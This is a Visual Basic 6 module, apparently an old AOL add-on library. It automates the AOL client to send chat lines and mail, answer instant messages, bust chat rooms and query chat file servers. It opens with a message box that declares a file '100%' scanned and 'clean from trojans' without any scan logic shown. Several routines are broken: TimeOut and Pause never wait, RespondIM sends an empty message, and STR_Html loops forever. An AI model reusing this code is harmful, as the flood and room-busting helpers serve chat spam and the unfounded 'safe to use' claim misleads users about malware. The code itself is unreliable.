TheMsg2 = TheMSg & FileName$ & " is clean from trojans." & Chr(13) & Chr(13)
TheMsg3 = TheMsg2 & FileName$ & " was scanned by " & ProgName & "." & Chr(13) & Chr(13)
TheMsg4 = TheMsg3 & "Scanned - 100% of - " & FileName$ & Chr(13) & Chr(13)
TheMsg5 = TheMsg3 & FileName$ & " is safe to use!" & Chr(13) & TheDots
MsgBox TheMsg5, 55, "File Is Clean!"
Errorr:
PentiumRest& = DoEvents()
Status.Caption = ""
Close #1
PentiumRest& = DoEvents()
Close #2
PentiumRest& = DoEvents()
Exit Sub
End Sub
Public Function ReadINI(Header As String, Key As String, location As String) As String
Dim sString As String
    sString = String(750, Chr(0))
    Key$ = LCase$(Key$)
    ReadINI$ = Left(sString, GetPrivateProfileString(Header$, ByVal Key$, "", sString, Len(sString), location$))
End Function
Sub Mail_Open()
Dim Toolbar As Long, ToolbarW As Long, Button As Long
Toolbar& = FindWindowEx(AOLWindow(), 0&, "AOL Toolbar", vbNullString)
ToolbarW& = FindWindowEx(Toolbar&, 0&, "_AOL_Toolbar", vbNullString)
Button& = FindWindowEx(ToolbarW&, 0&, "_AOL_Icon", vbNullString)
Click (Button&)
End Sub
Sub File_ReName(File$, NewName$)
Dim NoFreeze As Long
    Name File$ As NewName$
    NoFreeze& = DoEvents()
End Sub

Sub RespondIM(Message)
Dim AOL As Long, MDI As Long, IMWin As Long, Text As Long, Text2 As Long, Msg As String
AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, ">Instant Message From:")
    If IMWin& Then GoTo Found
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "  Instant Message From:")
    If IMWin& Then GoTo Found
Exit Sub
Found:
Text& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text2& = GetWindow(Text&, GW_HWNDNEXT)
Text2& = GetWindow(Text&, GW_HWNDNEXT)
Text2& = GetWindow(Text&, GW_HWNDNEXT)
Text2& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text2&, GW_HWNDNEXT)
Text& = GetWindow(Text2&, GW_HWNDNEXT)
Call SendMessageByString(Text&, WM_SETTEXT, 0, Msg)
Click (Text&)
TimeOut (1)
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "  Instant Message From:")
Text& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Text& = GetWindow(Text&, GW_HWNDNEXT)
Click (Text&)
End Sub


Function RoomBuster(Room As TextBox, counter As Label)
Room = FindChatRoom
If Room Then Window_Close (Room)
Do: DoEvents
    Call Keyword("aol://2719:2-2-" & Room & "")
        WaitForOKOrChatRoom (Room)
        counter = counter + 1
If FindChatRoom Then Exit Do
Loop
End Function
Sub RunMenu(menu1 As Integer, menu2 As Integer)
Static Working As Integer
Dim Menus As Long, SubMenu As Long, ItemID As Long, Works As Long, MenuClick As Long
Menus& = GetMenu(FindWindow("AOL Frame25", vbNullString))
SubMenu& = GetSubMenu(Menus&, menu1)
ItemID = GetMenuItemID(SubMenu&, menu2)
Works = CLng(0) * &H10000 Or Working
MenuClick = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, ItemID, 0&)
End Sub
Sub SNList_Save(lst As ListBox, CmmDlg As Control)
'Control is The CommonDialog.
With CmmDlg
    .CancelError = True
    .DialogTitle = "Save SNs"
    .Filter = "Text Files (*.txt)|*.txt"
    .FilterIndex = 0
    .ShowSave
End With

Dim sList As String
Dim lSN As Long
sList = ""
For lSN = 0 To lst.ListCount - 1
    If lSN = 0 Then
        sList = lst.List(lSN)
    Else
        sList = sList & "," & lst.List(lSN)
    End If
Next
Open CmmDlg.FileName For Output As #1
Print #1, sList
Close #1
Exit Sub
End Sub

Public Sub Scroll_List(lst As ListBox)
Dim X As Long
For X = 0 To lst.ListCount - 1
    SendChat (X & lst.List(X))
    TimeOut (0.75)
Next X
End Sub
Sub SendChat(Werds)
Dim Room As Long, Text As Long
Room& = FindChatRoom
Text& = FindWindowEx(Room&, 0&, "RICHCNTL", vbNullString)
Call SetFocusAPI(Text&)
Call SendMessageByString(Text&, WM_SETTEXT, 0&, Werds)
DoEvents
Call SendMessageByNum(Text&, WM_CHAR, 13, 0&)
Call SendMessageByNum(Text&, WM_CHAR, 13, 0&)
End Sub
Sub Window_SetText(Window, Text)
    Call SendMessageByString(Window, WM_SETTEXT, 0, Text)
End Sub
Sub Mail_Send(Recipiants, subject, Message)
Dim AOL As Long, ToolbarT As Long, ToolbarW As Long
Dim Button As Long, MDI As Long, MailWin As Long
Dim Edit As Long, Text As Long, GetIcon As Long
Dim Error As Long, Modal As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
ToolbarT& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
ToolbarW& = FindWindowEx(ToolbarT&, 0&, "_AOL_Toolbar", vbNullString)
Button& = FindWindowEx(ToolbarW&, 0&, "_AOL_Icon", vbNullString)
Button& = GetWindow(Button&, 2)
Button& = GetWindow(Button&, 2)
Click (Button&)
Do: DoEvents
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
MailWin& = FindWindowEx(MDI&, 0&, vbNullString, "Write Mail")
Edit& = FindWindowEx(MailWin&, 0&, "_AOL_Edit", vbNullString)
Text& = FindWindowEx(MailWin&, 0&, "RICHCNTL", vbNullString)
Button& = FindWindowEx(MailWin&, 0&, "_AOL_Icon", vbNullString)
Loop Until MailWin& <> 0 And Edit& <> 0 And Text& <> 0 And Button& <> 0
Call SendMessageByString(Edit&, WM_SETTEXT, 0, Recipiants)
    Edit& = GetWindow(Edit&, 2)
    Edit& = GetWindow(Edit&, 2)
    Edit& = GetWindow(Edit&, 2)
    Edit& = GetWindow(Edit&, 2)
Call SendMessageByString(Edit&, WM_SETTEXT, 0, subject)
Call SendMessageByString(Text&, WM_SETTEXT, 0, Message)
For GetIcon = 1 To 18
    Button& = GetWindow(Button&, 2)
Next GetIcon
Click (Button&)
Do: DoEvents
Error& = FindWindowEx(MDI&, 0&, vbNullString, "Error")
    Modal& = FindWindow("_AOL_Modal", vbNullString)
If MailWin& = 0 Then Exit Do
If Modal& <> 0 Then
    Button& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
    Click (Button&)
    Call SendMessage(MailWin&, WM_CLOSE, 0, 0)
    Exit Sub
End If
If Error& <> 0 Then
    Call SendMessage(Error&, WM_CLOSE, 0, 0)
    Call SendMessage(MailWin&, WM_CLOSE, 0, 0)
    Exit Do
End If
Loop
End Sub
Sub Server_Find(Who, What)
Call SendChat("/" & Who & " Find " & What)
TimeOut 0.7
End Sub
Sub Server_Send(Who, What)
Call SendChat("/" & Who & " Send " & What)
TimeOut 0.7
End Sub
Sub Server_Status(Who)
Call SendChat("/" & Who & " Send " & "Status")
TimeOut 0.7
End Sub

Function AOL_Show()
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
    Call ShowWindow(AOL&, 5)
End Function
Public Sub ShutDownWindows()
Dim EWX_SHUTDOWN
    Dim MsgRes As Long
    MsgRes = MsgBox("Do you really want to Shut Down Windows 9x", vbYesNo Or vbQuestion)
    If MsgRes = vbNo Then Exit Sub
Call ExitWindowsEx(EWX_SHUTDOWN, 0)
End Sub
Function IM_SNFrom()
Dim AOL As Long, MDI As Long, IMWin As Long, theSN As String
Dim IMTextWin As Long, IMCaption As String
AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, ">Instant Message From:")
    If IMWin& Then GoTo Found
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "  Instant Message From:")
    If IMWin& Then GoTo Found
Exit Function

Found:
IMCaption$ = GetCaption(IMWin&)
theSN$ = Mid(IMCaption$, InStr(IMCaption$, ":") + 2)
IM_SNFrom = theSN$
End Function
Sub Scroll_Spiral(Wha As TextBox)
Dim txt As String, thestring As String, TheLEN As Long, TheStr As Long
Call SendChat(Wha)
TimeOut (0.75)
    thestring = Wha
    TheLEN = Len(thestring)
TheStr = Mid(thestring, 2, TheLEN) + Mid(thestring, 1, 1)
    Wha = TheStr
End Sub

Sub StayOnTop(TheForm As Form)
    Call SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub



Function StringInList(TheList As ListBox, FindMe As String)
Dim a As Long
If TheList.ListCount = 0 Then GoTo ListEmpty
For a = 0 To TheList.ListCount - 1
TheList.ListIndex = a
    If UCase(TheList.Text) = UCase(FindMe) Then
        StringInList = a
    Exit Function
    End If
Next a
ListEmpty:
StringInList = -1
End Function
Function STR_backwards(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String
    InputText$ = Text
    Length& = Len(InputText$)
Do While Spaces& <= Length&
    Spaces& = Spaces& + 1
    NextChr$ = Mid$(InputText$, Spaces&, 1)
    NwO$ = NextChr$ & NwO$
Loop
STR_backwards = NwO$
End Function
Function STR_Dots(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String
    InputText$ = Text
    Length& = Len(InputText$)
Do While Spaces& <= Length&
    Spaces& = Spaces& + 1
    NextChr$ = Mid$(InputText$, Spaces&, 1)
    NextChr$ = NextChr$ + "•"
    NwO$ = NwO$ + NextChr$
Loop
STR_Dots = NwO$
End Function
Function STR_elite(Text$)
Dim NewText As String, X As Long, Letter As String, Leet As String
Dim P As Long
NewText$ = ""
For X = 1 To Len(Text$)
    Letter$ = ""
    Letter$ = Mid$(Text$, X, 1)
    Leet$ = ""
    P = Int(Rnd * 3 + 1)
    If Letter$ = "a" Then Leet$ = "â"
    If Letter$ = "b" Then Leet$ = "b"
    If Letter$ = "c" Then Leet$ = "ç"
    If Letter$ = "e" Then Leet$ = "ë"
    If Letter$ = "i" Then Leet$ = "î"
    If Letter$ = "j" Then Leet$ = "j"
    If Letter$ = "n" Then Leet$ = "ñ"
    If Letter$ = "o" Then Leet$ = "õ"
    If Letter$ = "s" Then Leet$ = "š"
    If Letter$ = "t" Then Leet$ = "†"
    If Letter$ = "u" Then Leet$ = "ü"
    If Letter$ = "w" Then Leet$ = "vv"
    If Letter$ = "y" Then Leet$ = "ÿ"
    If Letter$ = "0" Then Leet$ = "Ø"
    If Letter$ = "A" Then Leet$ = "Ã"
    If Letter$ = "B" Then Leet$ = "ß"
    If Letter$ = "C" Then Leet$ = "Ç"
    If Letter$ = "D" Then Leet$ = "Ð"
    If Letter$ = "E" Then Leet$ = "Ë"
    If Letter$ = "I" Then Leet$ = "Í"
    If Letter$ = "N" Then Leet$ = "Ñ"
    If Letter$ = "O" Then Leet$ = "Õ"
    If Letter$ = "S" Then Leet$ = "Š"
    If Letter$ = "U" Then Leet$ = "Û"
    If Letter$ = "W" Then Leet$ = "VV"
    If Letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    NewText$ = NewText$ & Leet$
Next X
STR_elite = NewText$
End Function
Function STR_Hacker(Text$)
Dim NewText As String, X As Long, Letter As String, Leet As String
Dim P As Long
NewText$ = ""
For X = 1 To Len(Text$)
    Letter$ = ""
    Letter$ = Mid$(Text$, X, 1)
    Leet$ = ""
    If Letter$ = "a" Then Leet$ = "a"
    If Letter$ = "b" Then Leet$ = "B"
    If Letter$ = "c" Then Leet$ = "C"
    If Letter$ = "d" Then Leet$ = "D"
    If Letter$ = "e" Then Leet$ = "e"
    If Letter$ = "f" Then Leet$ = "F"
    If Letter$ = "g" Then Leet$ = "G"
    If Letter$ = "h" Then Leet$ = "H"
    If Letter$ = "i" Then Leet$ = "i"
    If Letter$ = "j" Then Leet$ = "J"
    If Letter$ = "k" Then Leet$ = "K"
    If Letter$ = "l" Then Leet$ = "L"
    If Letter$ = "m" Then Leet$ = "M"
    If Letter$ = "n" Then Leet$ = "N"
    If Letter$ = "o" Then Leet$ = "o"
    If Letter$ = "p" Then Leet$ = "P"
    If Letter$ = "q" Then Leet$ = "Q"
    If Letter$ = "r" Then Leet$ = "R"
    If Letter$ = "s" Then Leet$ = "S"
    If Letter$ = "t" Then Leet$ = "T"
    If Letter$ = "u" Then Leet$ = "u"
    If Letter$ = "v" Then Leet$ = "V"
    If Letter$ = "w" Then Leet$ = "W"
    If Letter$ = "x" Then Leet$ = "X"
    If Letter$ = "y" Then Leet$ = "y"
    If Letter$ = "z" Then Leet$ = "Z"
    If Letter$ = "A" Then Leet$ = "a"
    If Letter$ = "B" Then Leet$ = "B"
    If Letter$ = "C" Then Leet$ = "C"
    If Letter$ = "D" Then Leet$ = "D"
    If Letter$ = "E" Then Leet$ = "e"
    If Letter$ = "F" Then Leet$ = "F"
    If Letter$ = "G" Then Leet$ = "G"
    If Letter$ = "H" Then Leet$ = "H"
    If Letter$ = "I" Then Leet$ = "i"
    If Letter$ = "J" Then Leet$ = "J"
    If Letter$ = "K" Then Leet$ = "K"
    If Letter$ = "L" Then Leet$ = "L"
    If Letter$ = "M" Then Leet$ = "M"
    If Letter$ = "N" Then Leet$ = "N"
    If Letter$ = "O" Then Leet$ = "o"
    If Letter$ = "P" Then Leet$ = "P"
    If Letter$ = "Q" Then Leet$ = "Q"
    If Letter$ = "R" Then Leet$ = "R"
    If Letter$ = "S" Then Leet$ = "S"
    If Letter$ = "T" Then Leet$ = "T"
    If Letter$ = "U" Then Leet$ = "u"
    If Letter$ = "V" Then Leet$ = "V"
    If Letter$ = "W" Then Leet$ = "W"
    If Letter$ = "X" Then Leet$ = "X"
    If Letter$ = "Y" Then Leet$ = "y"
    If Letter$ = "Z" Then Leet$ = "Z"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    NewText$ = NewText$ & Leet$
Next X
STR_Hacker = NewText$
End Function
Function STR_Html(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String, NumSpc As Long
    InputText$ = Text
    Length& = Len(InputText$)
Do While NumSpc& <= Length&
    Spaces& = Spaces& + 1
    NextChr$ = Mid$(InputText$, Spaces&, 1)
    NextChr$ = NextChr$ + "<html>"
    NwO$ = NwO$ + NextChr$
Loop
STR_Html = NwO$
End Function
Function STR_Link(URL, Text)
STR_Link = "<a href=" & Chr(34) & URL & Chr(34) & ">" & Text & "</a>"
End Function

Function STR_Spaced(Text As String)
Dim InputText As String, Length As Long, Spaces As Long
Dim NextChr As String, NwO As String
    InputText$ = Text
    Length& = Len(InputText$)
Do While Spaces& <= Length&
    Spaces& = Spaces& + 1
    NextChr$ = Mid$(InputText$, Spaces&, 1)
    NextChr$ = NextChr$ + " "
    NwO$ = NwO$ + NextChr$
Loop
STR_Spaced = NwO$
End Function
Sub TimeOut(Length)
    Dim begin As Long
    begin = Timer
Do While Timer - begin >= Length
    DoEvents
Loop
End Sub
Sub Pause(Length)
'Same As Timeout
    Dim begin As Long
    begin = Timer
Do While Timer - begin >= Length
    DoEvents
Loop
End Sub



Function UserSN()
Dim AOL As Long, MDI As Long, WelcomeW As Long
Dim Length As Long, Title As String, X As Long, User As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
WelcomeW& = FindWindowEx(MDI&, 0&, vbNullString, "Welcome, ")
    Length& = GetWindowTextLength(WelcomeW&)
    Title$ = String$(200, 0)
X& = GetWindowText(WelcomeW&, Title$, (Length& + 1))
User = Mid$(Title$, 10, (InStr(Title$, "!") - 10))
UserSN = User
End Function
Sub WaitForMailToLoad()
Dim MailBox As Long, Tree As Long, Check As Long
Dim Check2 As Long, Check3 As Long
    Call Mail_Read
Do
    MailBox& = FindWindowEx(AOLMDI(), 0&, vbNullString, UserSN & "'s Online Mailbox")
Loop Until MailBox& <> 0
    Tree& = FindWindowEx(MailBox&, 0&, "_AOL_Tree", vbNullString)
Do: DoEvents
    Check& = SendMessage(Tree&, LB_GETCOUNT, 0, 0&)
    TimeOut (1)
    Check2& = SendMessage(Tree&, LB_GETCOUNT, 0, 0&)
    TimeOut (1)
    Check3& = SendMessage(Tree&, LB_GETCOUNT, 0, 0&)
Loop Until Check& = Check2& And Check2& = Check3&
End Sub
Sub waitforok()
Dim waitforok As Long, OK As Long, OKButton As Long
Do
    DoEvents
    OK = FindWindow("#32770", "America Online")
    DoEvents
Loop Until OK <> 0
OKButton = FindWindowEx(OK, 0&, vbNullString, "OK")
    Call SendMessageByNum(OKButton, WM_LBUTTONDOWN, 0, 0&)
    Call SendMessageByNum(OKButton, WM_LBUTTONUP, 0, 0&)
End Sub

Public Sub WriteToINI(Header As String, Key As String, KeyValue As String, location As String)
    Call WritePrivateProfileString(Header$, UCase$(Key$), KeyValue$, location$)
End Sub
Function Form_Drag(Form As Form)
'This Goes In Mouse Down Events Of A Label/Button
    Call ReleaseCapture
    Call SendMessage(Form.hwnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Function
Function Form_Hide(Form As Form)
    Form.Hide
End Function
Function Form_Show(Form As Form)
    Form.Show
End Function
Function Form_Load(Form As Form)
    Form.Load
End Function
Function Form_Unload(Form As Form)
    Unload Form
End Function
